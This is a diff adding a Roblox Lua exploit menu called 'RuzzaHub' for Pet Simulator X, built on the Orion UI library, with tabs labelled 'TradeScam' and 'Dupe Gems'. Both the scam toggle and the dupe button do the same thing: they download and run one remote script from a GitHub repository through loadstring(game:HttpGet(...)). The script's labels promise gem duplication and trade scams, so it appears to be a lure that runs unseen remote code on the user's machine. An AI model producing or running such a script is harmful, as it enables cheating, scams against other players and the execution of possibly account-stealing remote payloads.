@@ -1,0 +1,48 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source%27)))()
+local Window = OrionLib:MakeWindow({Name = "RuzzaHub", HidePremium = true, SaveConfig = true, ConfigFolder = "34rew6g"})
+OrionLib:MakeNotification({
+    Name = "! CrazyNoob#6969",
+    Content = "Psx destroyer V10.8",
+    Image = "rbxassetid://4483345998",
+    Time = 5
+})
+local Info = Window:MakeTab({
+    Name = "Info",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+Info:AddParagraph("Credits","! CrazyNoob#6969")
+
+local Tradescam = Window:MakeTab({
+    Name = "TradeScam",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+Tradescam:AddToggle({
+    Name = "On/Off TradeScam!",
+    Default = false,
+    Callback = function(Value)
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/autofarm.lua", true))()
+    end
+})
+
+Tradescam:AddParagraph("TradeScam","Turn TradeScam On And Off")
+
+
+local Dupe = Window:MakeTab({
+    Name = "Dupe",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+Dupe:AddButton({
+    Name = "Dupe Gems!",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/autofarm.lua", true))()
+      end
+})
+
+
+Dupe:AddParagraph("Click to Dupe gems","CLICK ONCE IF NOTHING HAPPENS WITHIN 5 seconds CLICK TWICE")
+
+OrionLib:Init()
